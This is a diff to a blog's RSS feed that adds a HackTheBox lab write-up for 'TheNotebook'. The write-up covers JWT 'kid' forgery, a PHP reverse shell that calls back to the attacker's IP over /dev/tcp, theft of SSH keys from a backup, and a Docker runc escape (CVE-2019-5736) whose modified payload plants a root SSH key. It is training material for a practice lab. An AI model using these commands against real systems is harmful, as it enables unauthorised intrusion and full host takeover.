@@ -5,7 +5,364 @@
     <link>https://fahmifj.github.io/tags/docker/</link>
     <description>Recent content in Docker on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sat, 15 May 2021 22:00:39 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/docker/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 07 Aug 2021 21:07:15 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/docker/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - TheNotebook</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-thenotebook/</link>
+      <pubDate>Sat, 07 Aug 2021 21:07:15 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-thenotebook/</guid>
+      <description>Abusing JWT and breaking out of a Docker container</description>
+      <content:encoded><![CDATA[<p>TheNotebook is a medium difficulty Linux machine that runs a web-based note application. The app uses a JWT token to store the authentication cookie, and it can be forged to escalate to the web admin. With admin-level access, I&rsquo;m able to drop a PHP web shell into the system using the web upload functionality, which results in a shell access to the system. Enumeration of the system discovers a backup files that contains SSH keys of the users. This user is has <code>sudo</code> permission to run a Docker container. Furthermore, the installed Docker version is vulnerable to CVE-2019-5736, and this could be exploited to obtain root access on the host.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>JWT Key ID</li>
+<li>Docker breakout using CVE-2019-573</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li><a href="https://jwt.io">https://jwt.io</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TC scan discovers two open ports, SSH on port 22 and a NGINX web server on port 80.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ fscan 10.10.10.230 thenotebook
+nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.230 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p22,80,10010 -sC -sV -oA nmap/10-tcp-allport-thenotebook 10.10.10.230
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-07 02:29 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.230
+Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.
+
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open     http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: The Notebook - Your Note Keeper
+10010/tcp filtered rxapi
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.67 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>On port 80, the machine hosts a web application called &ldquo;The Notebook&rdquo;.</p>
+<p><img class="img-container" src="imgs/image-20210807133719995.png" alt="image-20210807133719995"  />
+</p>
+<p>I tried some default credentials on the login page, but no luck, so I will just register an account.</p>
+<p><img class="img-container" src="imgs/image-20210807134833301.png" alt="image-20210807134833301"  />
+</p>
+<p>And the site automatically logs me in.</p>
+<p><img class="img-container" src="imgs/image-20210807135132964.png" alt="image-20210807135132964"  />
+</p>
+<p>I can create a note on <code>/notes</code>. I will setup a Python web server and I will add a note that contains my HTB IP. Unfortunately, there is no incoming request on my web server.</p>
+<p><img class="img-container" src="imgs/image-20210807135517614.png" alt="image-20210807135517614"  />
+</p>
+<p>My note has link of <code>10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/8</code>. Because the second path looks like a GUID which is unique, so I think the attack is not an IDOR.</p>
+<p>Although, I said it&rsquo;s not an IDOR, I have a cool trick to share:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ curl -sI 10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/<span class="o">{</span>7..8<span class="o">}</span>
+HTTP/1.1 <span class="m">401</span> UNAUTHORIZED
+Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:48 GMT
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: <span class="m">12</span>
+Connection: keep-alive
+
+HTTP/1.1 <span class="m">200</span> OK
+Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:49 GMT
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: <span class="m">1710</span>
+Connection: keep-alive
+</code></pre></div><h4 id="gobuster">Gobuster</h4>
+<p>Running a <code>gobuster</code> scan reveals that there is an admin page (<code>/admin</code>), but I have no access there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ gobuster dir -u http://10.10.10.230/ -w /opt/SecLists/Discovery/Web-Content/common.txt -x txt -o gobuster/gobuster-S-80 -t <span class="nv">40</span> 
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.230/
+<span class="o">[</span>+<span class="o">]</span> Method:                  GET
+<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
+<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
+<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
+<span class="o">[</span>+<span class="o">]</span> Extensions:              txt
+<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+<span class="o">===============================================================</span>
+2021/08/07 02:44:26 Starting gobuster in directory enumeration <span class="nv">mode</span>
+<span class="o">===============================================================</span>
+/admin                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 9<span class="o">]</span>
+/login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1250<span class="o">]</span>
+/logout               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 209<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.10.230/<span class="o">]</span>
+/register             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1422<span class="o">]</span>                          
+                                                                          
+<span class="o">===============================================================</span>
+2021/08/07 02:44:49 <span class="nv">Finished</span>
+<span class="o">===============================================================</span>
+</code></pre></div><h4 id="playing-with-jwt-cookie">Playing with JWT Cookie</h4>
+<p>While inspecting the browser storage, I find the site generates two cookie:  <code>auth</code> and <code>uuid</code>. The <code>auth</code> cookie is a JWT token.</p>
+<p><img class="img-container" src="imgs/image-20210807141947185.png" alt="image-20210807141947185"  />
+</p>
+<blockquote>
+<p>Note: JWT token consists of header, payload, and signature that are separated by a dot and each part is encoded with base64.</p>
+</blockquote>
+<p>The <code>auth</code> cookie can decoded using <a href="https://jwt.io/">jwt.io</a>.</p>
+<p><img class="img-container" src="imgs/image-20210807143329934.png" alt="image-20210807143329934"  />
+</p>
+<p>The value of <code>kid</code> (key identifier) and <code>admin_cap</code> are interesting vectors to play with. First, I will grab the header value and decode it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»
+$ <span class="nb">echo</span> <span class="s1">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9&#39;</span> <span class="p">|</span> base64 -d
+<span class="o">{</span><span class="s2">&#34;typ&#34;</span>:<span class="s2">&#34;JWT&#34;</span>,<span class="s2">&#34;alg&#34;</span>:<span class="s2">&#34;RS256&#34;</span>,<span class="s2">&#34;kid&#34;</span>:<span class="s2">&#34;http://localhost:7070/privKey.key&#34;</span><span class="o">}</span>
+</code></pre></div><p>I can try to modify the <code>kid</code> value to point to my IP, then I will encode the header back to base64.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»
+$ <span class="nb">echo</span> -n <span class="s1">&#39;{&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;RS256&#34;,&#34;kid&#34;:&#34;http://10.10.14.17/privKey.key&#34;}&#39;</span> <span class="p">|</span> base64 -w0
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xNy9wcml2S2V5LmtleSJ9
+</code></pre></div><p>I will put back the forged header to cookie and setup a Python web server afterwards. When I refresh the page, there is an incoming request for <code>privKey.key</code> to my web server.</p>
+<p><img class="img-container" src="imgs/image-20210807151313793.png" alt="image-20210807151313793"  />
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="escalate-to-web-admin">Escalate to web admin</h4>
+<p>Since the  <code>kid</code>  value can be controlled by me, I can forge a token that has <code>admin_cap</code>  value set to true and so the app will look for my private key and eventually validates my forged token using that key.</p>
+<p>First, I will create <code>privKey.key</code> using <code>ssh-keygen</code>. I will host this key using the Python web server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.17» 
+$ ssh-keygen -t rsa -P <span class="s2">&#34;&#34;</span> -b <span class="m">4096</span> -m PEM -f privKey.key
+Generating public/private rsa key pair.
+Your identification has been saved in privKey.key
+Your public key has been saved in privKey.key.pub
+The key fingerprint is:
+SHA256:IWMd7YYOw6gQT2tpGCtbx3Iaav2yW1qs8lyYGVl90fo kali@kali
+The key<span class="err">&#39;</span>s randomart image is:
++---<span class="o">[</span>RSA 4096<span class="o">]</span>----+
+<span class="p">|</span>        .o.      <span class="p">|</span>
+<span class="p">|</span>o .   .. .o.     <span class="p">|</span>
+<span class="p">|</span> B + ++.o+.      <span class="p">|</span>
+<span class="p">|</span><span class="o">=</span> X B.+oooo      <span class="p">|</span>
+<span class="p">|</span>.B.X   +S..      <span class="p">|</span>
+<span class="p">|</span>o.o.*   .  E     <span class="p">|</span>
+<span class="p">|</span>.  +.<span class="o">=</span>           <span class="p">|</span>
+<span class="p">|</span> ...*.           <span class="p">|</span>
+<span class="p">|</span>  oB+            <span class="p">|</span>
++----<span class="o">[</span>SHA256<span class="o">]</span>-----+
+</code></pre></div><p>I will use <a href="https://jwt.io/">jwt.io</a> to forge a new token and sign it using my <code>privKey.key</code>, and I will put this forged token to the <code>auth</code> cookie.</p>
+<p><img class="img-container" src="imgs/image-20210807152924854.png" alt="image-20210807152924854"  />
+</p>
+<p>When I refresh the browse, I see a new menu on the navigation bar called &ldquo;Admin Panel&rdquo;.</p>
+<p><img class="img-container" src="imgs/image-20210807153522086.png" alt="image-20210807153522086"  />
+</p>
+<p>Heading to <code>/admin</code>, I see two options: <code>View Notes</code> and <code>Upload File</code>.</p>
+<p><img class="img-container" src="imgs/image-20210807154045797.png" alt="image-20210807154045797"  />
+</p>
+<p>The <code>View Notes</code> buttons points to <code>/admin/viewnotes</code>, and in this page all users' note can be viewed by the admin.</p>
+<p><img class="img-container" src="imgs/image-20210807154240999.png" alt="image-20210807154240999"  />
+</p>
+<p>Two interesting notes  created by the admin are <code>Need to fix config</code> and <code>Backups are scheduled</code>.</p>
+<p><img class="img-container" src="imgs/image-20210807154529651.png" alt="image-20210807154529651"  />
+</p>
+<p>The second note states that the server has regular backups set.</p>
+<p><img class="img-container" src="imgs/image-20210807154537751.png" alt="image-20210807154537751"  />
+</p>
+<p>The <code>File Upload</code> button points to <code>/admin/upload</code>. This page provides an upload functionality.</p>
+<p><img class="img-container" src="imgs/image-20210807160019742.png" alt="image-20210807160019742"  />
+</p>
+<h4 id="web-shell-upload">Web Shell Upload</h4>
+<p>According to the note titled with <code>Need to fix config</code>, I will try to drop the following PHP code on the upload page.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ <span class="nb">echo</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span> &gt; iamf-test.php 
+</code></pre></div><p>The file gets uploaded smoothly.</p>
+<p><img class="img-container" src="imgs/image-20210807163411701.png" alt="image-20210807163411701"  />
+</p>
+<p>The <code>View</code> buttons points to <code>http://10.10.10.230/48101bbdd897877cc62b8704a293a436.php</code>. I can confirm that I have code execution.</p>
+<p><img class="img-container" src="imgs/image-20210807163428110.png" alt="image-20210807163428110"  />
+</p>
+<p>I will upload the following PHP reverse shell and then setup a netcat listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.17/53 0&gt;&amp;1&#39;&#34;</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>I will trigger the reverse using <code>curl</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ curl -s http://10.10.10.230/11ee6b411f33fe8f9c49d1a02e5720b7.php
+</code></pre></div><p>Now on my listener, I have an interactive shell access as <code>www-data</code> .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.17<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.230<span class="o">]</span> <span class="m">39698</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1294<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+www-data@thenotebook:~/html$ 
+</code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
+<p>I will upgrade my shell to fully interactive one.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@thenotebook:~/html$ which script
+which script
+/usr/bin/script
+www-data@thenotebook:~/html$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@thenotebook:~/html$ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> suspended  nc -nvlp <span class="m">53</span>
+→ kali@kali «thenotebook» «10.10.14.17» 
+$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> continued  nc -nvlp <span class="m">53</span>
+
+www-data@thenotebook:~/html$ stty rows <span class="m">30</span> cols <span class="m">106</span>
+www-data@thenotebook:~/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-noah">Shell as noah</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Based on the previous admin notes, I start with enumeration of readable file that contains &ldquo;backup&rdquo; string. One that stands out is <code>/var/backups/home.tar.gz</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@thenotebook:~/html$ find / -type f -readable 2&gt;/dev/null <span class="p">|</span> grep -i <span class="s2">&#34;backup&#34;</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+/var/backups/home.tar.gz
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>I will grab that file to my attacking machine.</p>
+<p><img class="img-container" src="imgs/image-20210807165347848.png" alt="image-20210807165347848"  />
+</p>
+<p>The file contains an SSH private key for user <code>noah</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.17» 
+$ tar -zxvf home.tar.gz
+home/
+home/noah/
+home/noah/.bash_logout
+home/noah/.cache/
+home/noah/.cache/motd.legal-displayed
+home/noah/.gnupg/
+home/noah/.gnupg/private-keys-v1.d/
+home/noah/.bashrc
+home/noah/.profile
+home/noah/.ssh/
+home/noah/.ssh/id_rsa
+home/noah/.ssh/authorized_keys
+home/noah/.ssh/id_rsa.pub
+</code></pre></div><h4 id="ssh---noah">SSH - noah</h4>
+<p>With the obtained private key, I can SSH login into the machine as noah.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ ssh -i loot/home/noah/.ssh/id_rsa noah@10.10.10.230
+Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+  System information as of Sat Aug  <span class="m">7</span> 09:57:29 UTC <span class="m">2021</span>
+
+  System load:  0.03              Processes:              <span class="m">184</span>
+  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">0</span>
+  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
+  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+Last login: Wed Feb <span class="m">24</span> 09:09:34 <span class="m">2021</span> from 10.10.14.5
+noah@thenotebook:~$ id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span>
+</code></pre></div><p>User flag is done here</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ cat user.txt <span class="p">|</span> sed -s <span class="s1">&#39;s/[a-f]/\*/g&#39;</span>
+*881626900**9*271**710*266*9427*
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>User noah is allowed to run <code>/usr/bin/docker exec -it webapp-dev01*</code> as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo -l
+Matching Defaults entries <span class="k">for</span> noah on thenotebook:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User noah may run the following commands on thenotebook:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01*
+</code></pre></div><h4 id="docker-breakout-cve-2019-5736">Docker Breakout CVE-2019-5736</h4>
+<p>The currently installed docker is vulnerable to CVE-2019-5736. More details about the vulnerability can be read <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">here</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ docker version
+Client:
+ Version:           18.06.0-ce
+ API version:       1.38
+ Go version:        go1.10.3
+ Git commit:        0ffa825
+ Built:             Wed Jul <span class="m">18</span> 19:09:54 <span class="m">2018</span>
+ OS/Arch:           linux/amd64
+ Experimental:      <span class="nb">false</span>
+Got permission denied <span class="k">while</span> trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.38/version: dial unix /var/run/docker.sock: connect: permission denied
+</code></pre></div><p>To exploit this vulnerability, I will be using this <a href="https://github.com/Frichetten/CVE-2019-5736-PoC.git">PoC</a> by Frichetten. I will clone the PoC to my working directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.17» 
+$ git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
+Cloning into <span class="s1">&#39;CVE-2019-5736-PoC&#39;</span>...
+remote: Enumerating objects: 45, <span class="k">done</span>.
+remote: Total <span class="m">45</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">45</span>
+Receiving objects: 100% <span class="o">(</span>45/45<span class="o">)</span>, 1.69 MiB <span class="p">|</span> 254.00 KiB/s, <span class="k">done</span>.
+Resolving deltas: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.
+</code></pre></div><p>I will modify the payload of <code>main.go</code> to add my SSH public key to <code>authorized_keys</code> file of the root account.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">payload</span> <span class="p">=</span> <span class="s">&#34;#!/bin/bash \n mkdir -p /root/.ssh/ &amp;&amp; echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39; &gt; /root/.ssh/authorized_keys&#34;</span>
+</code></pre></div><p>I will compile the PoC and host it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «CVE-2019-5736-PoC» «10.10.14.17» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+$ go build -o exploit_runc main.go <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">8080</span>
+Serving HTTP on 0.0.0.0 port <span class="m">8080</span> <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</code></pre></div><p>On TheNotebook, I will have two SSH sessions. On the first SSH session, I will use it to download and execute the exploit within the container.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 bash
+root@0f4c2517af40:/opt/webapp# wget -q 10.10.14.17:8080/breakout <span class="o">&amp;&amp;</span> chmod +x breakout
+root@0f4c2517af40:/opt/webapp# ./breakout
+<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+</code></pre></div><p>Then on the second session, I will run the sudo command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 /bin/sh
+</code></pre></div><p>But then, I get the following results</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@0f4c2517af40:/opt/webapp# ./breakout
+<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+<span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">17638</span>
+<span class="o">[</span>+<span class="o">]</span> Found the PID: self
+strconv.Atoi: parsing <span class="s2">&#34;self&#34;</span>: invalid syntax
+</code></pre></div><p>To resolve that, at line 42, I modified the following line to ignore anything that contains &ldquo;self&rdquo;. I will recompile the exploit and get it back to the container.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go">		<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">f</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">pids</span> <span class="p">{</span>
+			<span class="nx">fbytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="s">&#34;/proc/&#34;</span> <span class="o">+</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#34;/cmdline&#34;</span><span class="p">)</span>
+			<span class="nx">fstring</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">fbytes</span><span class="p">)</span>
+			<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">fstring</span><span class="p">,</span> <span class="s">&#34;runc&#34;</span><span class="p">)</span> <span class="p">{</span>
+				<span class="k">if</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">(),</span> <span class="s">&#34;self&#34;</span><span class="p">)</span> <span class="p">{</span>
+					<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Found the PID:&#34;</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
+					<span class="nx">found</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
+					<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+						<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+						<span class="k">return</span>
+					<span class="p">}</span>
+				<span class="p">}</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+</code></pre></div><p>This time, it works</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@c8cf4072ca26:/opt/webapp# ./breakout 
+<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+
+<span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">1729</span>
+<span class="o">[</span>+<span class="o">]</span> Getting file handle
+<span class="o">[</span>+<span class="o">]</span> Successfully got the file handle
+<span class="o">[</span>+<span class="o">]</span> Successfully got write handle <span class="p">&amp;</span><span class="o">{</span>0xc000444000<span class="o">}</span>
+root@c8cf4072ca26:/opt/webapp# 
+root@c8cf4072ca26:/opt/webapp# 
+</code></pre></div><h4 id="ssh---root">SSH - Root</h4>
+<p>I can SSH login into the machine as root using my own private keys.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»  
+$ ssh root@10.10.10.230
+Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+  System load:  0.1               Processes:              <span class="m">190</span>
+  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">1</span>
+  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
+  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1
+
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+Last login: Fri Jul <span class="m">23</span> 14:27:18 <span class="m">2021</span>
+root@thenotebook:~# 
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/</a></li>
+<li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Ready</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-ready/</link>
